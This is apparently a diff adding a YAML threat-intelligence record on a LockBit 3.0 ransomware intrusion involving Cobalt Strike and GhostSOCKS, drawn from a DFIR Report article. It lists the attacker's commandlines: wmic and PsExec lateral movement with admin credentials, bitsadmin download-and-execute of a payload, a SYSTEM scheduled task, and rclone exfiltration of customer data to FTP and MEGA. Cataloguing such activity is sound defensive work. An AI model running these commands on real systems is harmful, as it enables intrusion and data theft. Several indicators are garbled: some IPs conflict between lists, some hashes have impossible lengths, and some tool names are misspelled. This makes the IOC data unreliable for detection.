@@ -1,0 +1,176 @@
+description: A ransomware campaign leveraging LockBit 3.0 with extensive lateral movement,
+  persistence via scheduled tasks and registry run keys, and exfiltration attempts
+  using rclone.
+attribution: APT group (unnamed), likely state-sponsored
+malware_families:
+- CobaltStrike
+- SystemBC
+- GhostSOCKS
+- LockBit
+- LockBit 3.0
+- Cobalt Strike
+TTPs:
+  processes:
+  - cmd.exe
+  - PsExec.exe
+  - wmiprvse.exe
+  - bitsadmin
+  - PSEXESVC.exe
+  - schtasks
+  - rundll32
+  - ntpdutil
+  - rclone.exe
+  - COPY.bat
+  - DEF.bat
+  - ds.exe
+  - setup_wm.exe
+  - RDP.BAT
+  - tailadvertisi
+  - WMLBAT
+  - COPYI1.BAT
+  - EXEI.BAT
+  - WMII.BAT
+  - Psexec.exe
+  - check.exe
+  - Veeam-Get-Creds.psl
+  commandline:
+  - cmd.exe /c "%PUBLIC%\Music\SETUP.bat"
+  - net session
+  - net share share$=%PUBLIC%\Music /GRANT:Everyone,READ /Y
+  - cmd.exe /c "%PUBLIC%\Music\WMI.bat" %PUBLIC%\Music\SETUP.bat %PUBLIC%\Music\COPY.bat
+    %PUBLIC%\Music\DEF.bat %PUBLIC%\Music\ds.exe
+  - wmic /node:ipv4address,REDACTED,REDACTED,REDACTED,REDACTED /user:"domain.local\\Administrator"
+    /password:"REDACTED" process call create "cmd.exe /c bitsadmin /transfer update_service
+    \\\\REDACTED\share$\\ds.exe %APPDATA%\ds.exe&%APPDATA%\ds.exe -pass REDACTED"
+  - PsExec.exe /accepteula @comps1.txt -u "domain.local\\Administrator" -p "REDACTED"
+    cmd /c COPY "\\\\REDACTED\share$\\ds.exe" "%WINDIR%\temp"
+  - cmd.exe /c "%PUBLIC%\Music\share$\\COPY.bat" PsExec.exe /accepteula -d \\\\REDACTED
+    -u "domain.local\\Administrator" -p "REDACTED" cmd /c COPY /Y "\\\\REDACTED\share$\\ds.exe"
+    "%PUBLIC%\Music"
+  - cmd.exe /c "C:\\share$\\EXE1.bat" C:\\share$\\PsExec.exe -d @C:\\share$\\comps1.txt
+    -u "domain.local\\Administrator" -p "REDACTED" cmd /c %WINDIR%\temp\ds.exe -pass
+    REDACTED
+  - cmd.exe /c "C:\\share$\\WMI1.bat" wmic /node:@C:\\share$\\comps1.txt /user:"domain.local\\Administrator"
+    /password:"REDACTED" process call create "cmd.exe /c bitsadmin /transfer ds \\\\REDACTED\share$\\ds.exe
+    %APPDATA%\ds.exe&%APPDATA%\ds.exe -pass REDACTED"
+  - wmiprvse.exe cmd.exe /c bitsadmin /transfer ds \\\\REDACTED\share$\\ds.exe %APPDATA%\ds.exe&%APPDATA%\ds.exe
+    -pass REDACTED
+  - schtasks /create /ru SYSTEM /sc ONSTART /tn Update2 /tr "cmd /c rundll32 %PUBLIC%\music\svcmc.dll,
+    MainFunc"
+  - rclone.exe copy E:\REDACTED\customers ftp1:REDACTED/customers -q --ignore-existing
+    --REDACTED-confirm --multi-thread-streams 12 --transfers 12 --no-console
+  - cmd.exe /C ".\\rclone.exe copy \"E:\\REDACTED\\domain\" mega:REDACTED/domain -q
+    --ignore-existing --REDACTED-confirm --multi-thread-streams 12 --transfers 12
+    --no-console"
+  powershell:
+  - Veeam-Get-Creds.psl
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: bitsadmin
+    destination: \\\\REDACTED\share$\\ds.exe
+  - process: wmiprvse.exe
+    destination: \\\\REDACTED\share$\\ds.exe
+  - process: PsExec.exe
+    destination: \\\\REDACTED\share$\\ds.exe
+  - executable: setup_wm.exe
+    destination: https://accessservicesonline.com/setup_wm.exe
+    port: 443
+  - executable: DEF.BAT
+    destination: user.compdatasystems.com
+    port: 443
+  - executable: Cobalt Strike
+    destination: 159.100.14.254
+    port: 443
+  - executable: RDP.BAT
+    destination: 185.236.232.20
+    port: 445
+  - executable: COPYI1.BAT
+    destination: 38.180.61.247
+    port: 30001
+  - executable: EXEI.BAT
+    destination: 195.2.70.38
+    port: 30001
+  - executable: GhostSOCKS
+    destination: 91.142.74.28
+    port: 30001
+  - executable: WMII.BAT
+    destination: 93.115.26.127
+    port: 21
+  - executable: Psexec.exe
+    destination: 46.21.250.52
+    port: 21
+  - executable: Rclone FTPLockbit
+    destination: 93.115.27.150
+    port: 21
+  file_activity:
+  - '%PUBLIC%\Music\SETUP.bat'
+  - '%PUBLIC%\Music\WMI.bat'
+  - '%PUBLIC%\Music\COPY.bat'
+  - '%PUBLIC%\Music\DEF.bat'
+  - '%PUBLIC%\Music\ds.exe'
+  - C:\\share$\\EXE1.bat
+  - C:\\share$\\WMI1.bat
+  - path: C:\\COPY.bat
+  - path: C:\\Users\\Public\\Music\\DEF.bat
+  - path: C:\\Users\\Public\\Music\\ds.exe
+  - path: C:\\setup_wm.exe
+  - path: C:\\RDP.BAT
+  - path: C:\\tailadvertisi
+  - path: C:\\WMLBAT
+  - path: C:\\COPYI1.bat
+  - path: C:\\EXEI.bat
+  - path: C:\\WMII.bat
+  - path: C:\\Psexec.exe
+  - path: C:\\check.exe
+  - path: C:\\Veeam-Get-Creds.psl
+  persistence:
+  - Scheduled Task (T1053.005)
+  - Service Execution (T1569.002)
+  - Registry Run Keys / Startup Folder (T1547.001)
+  - Process Injection (T1055)
+  process_relations: []
+IOCs:
+  hashes:
+  - 6505b488d0c7f3eaee66e3db103d7b05
+  - bf2b396b8fb0b1de27678aab877b6f177546d1c5
+  - b4ad5df385ee964fe9a800f2cdaa03626c8e8811ddb171f8e821876373335e63
+  - 671b967eb2bc04a0cd892ca225eb5034ab1777107d9996e647d43d1194922b810f198514
+  - b79bb3302691936df7c3315ff3ba7027f722fc43d366ba354ac9c3dac2e01d03
+  - 03af38505cee81b9d6ecd8c1fd896e0e1ac66fcc34c0b86def886e4e168030dae096927c2389b3978887ec1094b26b35e21e9c77826d91f7fa25b2a1cb5ad836ba2d7ec4
+  - 0f7b6bb3a239cf7a668a8625e63326395263a135f09185aa44f6b73d2f8160f56779706d18051333e658c4816ff3576a2e9d97fe2a1196ac0ea5ed9ba386c46defafdb88
+  - ea327ed0a3243847f7cd87661e22e1de450d54d5737164579416ca99af1eb3fa1d4aaff9ced4ee8a9814c243f0c157cda900def172b95bb4bc8535e480fe432ab84b9175
+  - 57f791f7477b1f7a1b3605465d054db8bba1bc3ebf07ca3c4e2442f0ba9ea18383ce627bd8b2d883d3b376833fa8e2093b82d0a118ba13b01a2054f8447f57d9fec67030
+  - 6e91c474d90546845b1f3f9e7a33411a9352236ad6fe8835979cf11ba5033f8f2fef0f193f97e112f0c5ddf0255ef461746a223208dc0846bde2a6dca9c825d09
+  ips:
+  - 31.172.83.162
+  - 159.100.14.254
+  - 185.236.232.20
+  - 91.142.74.28
+  - 95.2.70.38
+  - 38.180.61.247
+  - 93.115.26.127
+  - 46.21.250.52
+  - 195.2.70.38
+  - 93.115.27.150
+  domains:
+  - accessservicesonline.com
+  - compdatasystems.com
+  - retailadvertisingservices.com
+  - SystemBC.com
+  - user.compdatasystems.com
+  - rclone mega.io
+  urls: []
+  ip_addresses:
+  - 31.172.83.162
+  - 59.100.14.254
+  - 195.2.70.38
+  - 91.142.74.28
+authors:
+- r3nzsec
+- MyDFIR
+- MittenSec
+reference: https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware
+date_of_publication: January 27, 2025
+file_creation_date: October 05, 2025
